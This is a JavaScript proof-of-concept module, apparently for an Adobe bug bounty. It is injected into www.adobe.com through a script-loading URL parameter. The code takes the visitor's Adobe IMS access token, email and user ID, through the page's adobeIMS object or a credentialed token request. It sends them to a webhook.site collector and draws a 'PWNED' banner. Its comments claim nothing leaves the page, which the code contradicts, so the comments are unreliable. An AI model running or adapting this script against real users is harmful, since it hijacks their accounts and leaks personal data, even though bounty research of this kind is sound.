// PoC — Adobe bug bounty, d0x, 2026-07-27
//
// Modulo ES que www.adobe.com carga cuando se le pasa
//   ?maslibs=hoodhmnd.github.io/poc/evil.js#--
// Solo demuestra que corre en el origen de Adobe. No exfiltra nada: todo lo
// que muestra queda en la pantalla de quien lo ejecuta.

// --- candado de instancia -----------------------------------------------
// Milo importa varios componentes (merch-card, merch-card-collection, ...).
// Con el '#' cada nombre produce una entrada distinta en el module map aunque
// la red pida siempre este mismo archivo, asi que el modulo se ejecuta varias
// veces. Sin este candado se apilan varios banners con el mismo id y el fetch
// termina escribiendo en uno tapado.
if (window.__D0X_PWN__) {
  console.log('[d0x] modulo re-ejecutado, banner ya presente');
} else {
  window.__D0X_PWN__ = true;
  run();
}

function run() {
  const origen = window.location.origin;

  // === COLECTOR DEL ATACANTE ==============================================
  // A donde se manda el token de la victima. Por defecto tu colector LOCAL
  // (poc-collector.py escuchando en 127.0.0.1:8899). Loopback solo funciona si
  // VOS abris el link en la misma maquina donde corre el colector — que es la
  // demo correcta: sos tu propia victima con tu cuenta de prueba.
  //
  // Para el plano "web PUBLICA recibe el token" (una victima en otra maquina),
  // cambia esta linea por tu URL de interactsh, p.ej.:
  //   const COLLECTOR = 'https://abcd1234.oast.fun';
  const COLLECTOR = 'https://webhook.site/86b8e563-613b-43e4-8e58-9a61e4c7c991';

  // Manda el token al colector por dos vias, para atravesar el preflight de
  // Private Network Access pase lo que pase:
  //   1) Image beacon — subrecurso no-cors, no necesita leer la respuesta.
  //   2) fetch keepalive — sobrevive a la navegacion; el colector responde
  //      ACAO:* y Allow-Private-Network, asi que no lo bloquea PNA.
  const enviar = (token, email, userId) => {
    const url =
      COLLECTOR + '/?t=' + encodeURIComponent(token) +
      '&e=' + encodeURIComponent(email || '') +
      '&u=' + encodeURIComponent(userId || '');
    try { new Image().src = url; } catch (e) { /* ignora */ }
    try {
      // no-cors: la entrega igual llega al colector aunque no leamos la
      // respuesta; evita ruido de CORS en consola durante la grabacion.
      fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true })
        .then(() => console.log('[d0x] token enviado al colector'))
        .catch((e) => console.warn('[d0x] beacon fetch fallo (img de respaldo ya salio):', e));
    } catch (e) { /* ignora */ }
  };

  // 1 — marcador programatico, para leer desde consola
  window.__PWNED__ = {
    origin: origen,
    href: window.location.href,
    cookieBytes: document.cookie.length,
    metaCsp: document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? 'si' : 'ninguna',
    ts: new Date().toISOString(),
  };

  document.title = 'PWNED — ' + window.location.hostname;

  // 2 — banner visible, para que se vea en video
  const banner = document.createElement('div');
  banner.style.cssText = [
    'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
    'background:#b30000', 'color:#fff', 'padding:18px 22px',
    'font:600 16px/1.5 -apple-system,Segoe UI,Roboto,sans-serif',
    'box-shadow:0 2px 12px rgba(0,0,0,.4)',
  ].join(';');
  banner.innerHTML =
    '<div style="font-size:19px;margin-bottom:6px">' +
    'Arbitrary JavaScript from an attacker-controlled host is executing here</div>' +
    '<div style="font-weight:400;font-size:14px">' +
    'origin <b>' + origen + '</b> &nbsp;·&nbsp; ' +
    'module loaded from <b>https://hoodhmnd.github.io/poc/evil.js</b></div>' +
    '<div class="d0x-ims" style="font-weight:400;font-size:14px;margin-top:6px">' +
    'IMS: consultando…</div>';
  (document.body || document.documentElement).appendChild(banner);

  // Referencia directa. NO getElementById: si hubiera otro banner, el id
  // duplicado devuelve el equivocado y la linea queda congelada.
  const linea = banner.querySelector('.d0x-ims');
  let listo = false;
  const decir = (html) => {
    if (listo) return;
    listo = true;
    linea.innerHTML = 'IMS: ' + html;
  };

  // Red de seguridad: pase lo que pase, en 8s la linea dice algo.
  setTimeout(() => decir('sin respuesta en 8s — mira la consola'), 8000);

  // 3 — la escalada: obtener un token IMS con la sesion de quien visita.
  //     Solo se muestran LARGO del token, email y userId. Nunca el token, y
  //     nada sale de esta pagina.
  const mostrar = (token, email, userId, via) => {
    decir(
      '<b>token obtenido</b> (' + via + ') — largo <b>' + token.length + '</b>' +
      ' · email <b>' + (email || '-') + '</b>' +
      ' · userId <b>' + (userId || '-') + '</b>' +
      '<br>enviado al colector <b>' + COLLECTOR + '</b>'
    );
    window.__PWNED__.imsTokenLength = token.length;
    window.__PWNED__.imsEmail = email || null;
    window.__PWNED__.imsUserId = userId || null;
    console.log('[d0x] token IMS obtenido via ' + via + ', largo ' + token.length);
    enviar(token, email, userId);
  };

  // Camino A — la instancia de IMS que Milo ya tiene cargada en la pagina.
  //            Es el camino nativo y el mas fiable en www.adobe.com.
  const esperarIms = (intentos) => {
    const ims = window.adobeIMS;
    if (ims && typeof ims.getAccessToken === 'function') {
      let tok = null;
      try { tok = ims.getAccessToken(); } catch (e) { /* sigue al camino B */ }
      if (tok && tok.token) {
        let email = null, userId = null;
        try {
          const p = ims.getProfile && ims.getProfile();
          if (p && typeof p.then === 'function') {
            p.then((prof) => {
              mostrar(tok.token, prof && prof.email, prof && prof.userId, 'window.adobeIMS');
            }).catch(() => mostrar(tok.token, null, null, 'window.adobeIMS'));
            return;
          }
        } catch (e) { /* ignora */ }
        mostrar(tok.token, email, userId, 'window.adobeIMS');
        return;
      }
    }
    if (intentos > 0) return setTimeout(() => esperarIms(intentos - 1), 300);
    caminoB();
  };

  // Camino B — pedirle el token a IMS directamente, con la sesion del visitante.
  const caminoB = () => {
    fetch('https://adobeid-na1.services.adobe.com/ims/check/v6/token', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'client_id=homepage_milo&scope=AdobeID,openid,gnav,pps.read,read_organizations',
    })
      .then((r) => r.text().then((t) => ({ status: r.status, body: t })))
      .then(({ status, body }) => {
        let j = null;
        try { j = JSON.parse(body); } catch (e) { /* respuesta vacia o no-JSON */ }
        console.log('[d0x] IMS check/v6 ->', status, body.slice(0, 200));
        if (j && j.access_token) {
          mostrar(j.access_token, j.email, j.userId, 'check/v6');
        } else {
          decir(
            'sin token — HTTP <b>' + status + '</b>' +
            (j && j.error ? ' · ' + j.error : ' · cuerpo de ' + body.length + ' bytes') +
            ' (visitante sin sesion de Adobe?)'
          );
        }
      })
      .catch((e) => {
        console.error('[d0x] IMS fetch fallo', e);
        decir('fetch fallo — <b>' + e + '</b>');
      });
  };

  esperarIms(10); // hasta ~3s esperando a que Milo inicialice adobeIMS
}

// El cargador de Adobe espera un custom element; se lo damos para que no
// rompa el resto de la pagina.
export class MerchCard extends HTMLElement {}
export default {};
